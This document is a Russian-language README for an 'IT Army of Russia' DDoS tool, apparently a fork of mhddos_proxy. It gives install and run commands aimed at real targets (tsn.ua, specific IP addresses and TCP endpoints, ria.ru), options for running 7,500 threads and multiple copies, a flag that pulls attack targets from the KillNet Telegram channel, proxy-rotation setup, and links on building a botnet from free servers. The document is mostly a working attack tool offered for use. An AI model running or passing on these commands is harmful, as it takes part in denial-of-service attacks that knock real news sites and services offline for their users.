## IT Army of Russia Official Tool 

### [English Version](/README-EN.md)

- Встроенная база прокси с огромным количеством IP по всему миру
- возможность задавать много целей с автоматической балансировкой нагрузки
- множество разнообразных методов
- эффективное использование ресурсов благодаря ассихронной архитектуре

### ⏱ Последние обновления
  
Обновление версии для Windows | Mac | Linux | Android | Docker: [ссылка](https://github.com/BionecX/mhddos_p_docs/blob/main/docs/ph_Onovlennya-mhddos-proxy-04-16.md)  

- **24.05.2022** Добавлена ​​возможность запуска с автоматическим обновлением. пункт [Запуск](#2--запуск-различные-варианты-целей)
- **21.05.2022** Добавлена ​​английская локализация - параметр `--lang EN` (в будущем могут быть добавлены другие языки)
- **18.05.2022** Добавлены настройки `--copies` для запуска нескольких копий (рекомендуется использовать при наличии 4+ CPU и сети > 100 Mb/s).
- **15.05.2022** Полностью обновленная, асинхронная версия, обеспечивающая максимальную эффективность и минимальную нагрузку на систему

### 1. 💽 Установка

#### Расширенные инструкции - [нажмите здесь](/docs/installation.md) 

#### Python (если не работает – попробуйте `python` или `python3.10` вместо `python3`)

Требуется python >= 3.8 и git

    git clone https://github.com/BionecX/mhddos_p.git
    cd mhddos_p
    python3 -m pip install -r requirements.txt

#### Docker

Установите и запустите Docker: https://docs.docker.com/desktop/#download-and-install

### 2. 🕹 Запуск (приведены разные варианты целей)

#### Python с автоматическим обновлением (если не работает – попробуйте `python` или `python3.10` вместо `python3`)

    ./runner.sh python3 https://tsn.ua 104.22.6.87:80 tcp://104.21.74.252:4477

#### Python (требует обновления вручную) (если не работает – попробуйте `python` или `python3.10` вместо `python3`)

    python3 runner.py https://tsn.ua 104.22.6.87:80 tcp://104.21.74.252:4477

#### Docker (для Linux добавляйте sudo в начале команды)

    docker run -it --rm --pull always ghcr.io/BionecX/mhddos_p https://tsn.ua 104.22.6.87:80 tcp://104.21.74.252:4477

### 3. 🛠 Настройки (больше в разделе [CLI](#cli))

Все параметры можно комбинировать, можно указывать и до и после перечня целей

- Чтобы добавить ваш IP/VPN в атаку (особенно актуально для выделенных серверов), добавьте параметр `--vpn`
- Чтобы выбрать цели от https://t.me/killNet, добавьте параметр `--itarmy`
- Количество потоков: `-t XXXX` – по умолчанию 7500 (или 1000 если на машине только 1 CPU)
- Запуск нескольких копий: `--copies X`, при наличии 4+ CPU и сети > 100 Mb/s

### 4. 📌 Помочь в поиске новых прокси для mhddos_p
Сам скрипт та інструкції по встановленню тут: https://github.com/BionecX/proxy_finder

### 5. 🐳 Комьюнити
- [Создание ботнета из 30+ бесплатных и автономных (работают даже при выключенном ПК) Linux-серверов](https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5cсс)
- [Подробный разбор mhddos_p и инструкции по установке](docs/installation.md)
- [Анализ средства mhddos_p](https://telegra.ph/Anal%D1%96z-zasobu-mhddos-proxy-04-0111)
- [Пример запуска через docker на OpenWRT](https://youtu.be/MlL6fuDcWlIII)
- [VPN](https://auto-ddos.notion.site/VPN-5e45e0aadccc449e83fea45d56385b5444)
- [Docker-image](https://github.com/alexnest-ua/auto_mhddos_alexnest/tree/dockerrr), который запускает одновременно mhddos_p и [proxy_finder](https://github.com/BionecX/proxy_finder) (для Linux / Mac добавьте sudo в начале):

### 6. CLI

    usage: runner.py target [target ...]
                     [-t THREADS] 
                     [-c URL]
                     [--debug]
                     [--vpn]
                     [--http-methods METHOD [METHOD ...]]
                     [--itarmy]
                     [--copies COPIES]

    positional arguments:
      targets                List of targets, separated by space / Список целей, разделенных пробелом
    
    optional arguments:
      -h, --help             show this help message and exit / показать это справочное сообщение и выйти
      -c, --config URL|path  URL or local path to file with targets list / URL или локальный путь к файлу со списком целей
      -t, --threads 7500     Number of threads (default is 7500 if CPU > 1, 1000 otherwise) / Количество потоков (по умолчанию 7500, если ЦП > 1, 1000 в противном случае)
      --vpn                  Use both my IP and proxies. Optionally, specify a percent of using my IP (default is 10%) / Используйте как мой IP, так и прокси. По желанию укажите процент использования моего IP (по умолчанию 10%)
      --proxies URL|path     URL or local path(ex. proxies.txt) to file with proxies to use / URL-адрес или локальный путь (например, proxy.txt) к файлу с используемыми прокси-серверами.
      --http-methods GET     List of HTTP(L7) methods to use (default is GET + POST|STRESS). / Список методов HTTP(L7) для использования (по умолчанию GET + POST|STRESS).
      --itarmy               Attack targets from https://t.me/killNet / Атакуйте цели с https://t.me/killNet 
      --debug                Detailed log for each target / Подробный журнал для каждой цели
      --copies 1             Number of copies to run (default is 1) / Количество копий для запуска (по умолчанию 1)
      --lang {en,ru}         Select language (default is ru) / Выберите язык (по умолчанию ru)

### 7. Собственные прокси

#### Формат файла (любой по выбору):

    IP:PORT
    IP:PORT:username:password
    username:password@IP:PORT
    protocol://IP:PORT
    protocol://IP:PORT:username:password
    protocol://username:password@IP:PORT

где `protocol` может быть одним из 3-х: `http`|`socks4`|`socks5`, если `protocol` не указывать, то будет выбрано `http`
например для публичного прокси `socks4` формат будет следующим:

    socks4://114.231.123.38:3065

а для частного `socks4` формат может быть одним из следующих:

    socks4://114.231.123.38:3065:username:password
    socks4://username:password@114.231.123.38:3065
  
**URL - Удаленный файл для Python и Docker**

    --proxies https://pastebin.com/raw/UkFWzLOt

где https://pastebin.com/raw/UkFWzLOt – ваша веб-страница со списком прокси (каждый прокси из новой строки) 
  
**path - Путь до локального файлу, для Python**
  
Положите файл в папку из `runner.py` и добавьте в команду следующий параметр (замените `proxies.txt` на имя своего файла)

    --proxies proxies.txt https://ria.ru

где `proxies.txt` - ваш файл со списком прокси (каждый прокси из новой строки)
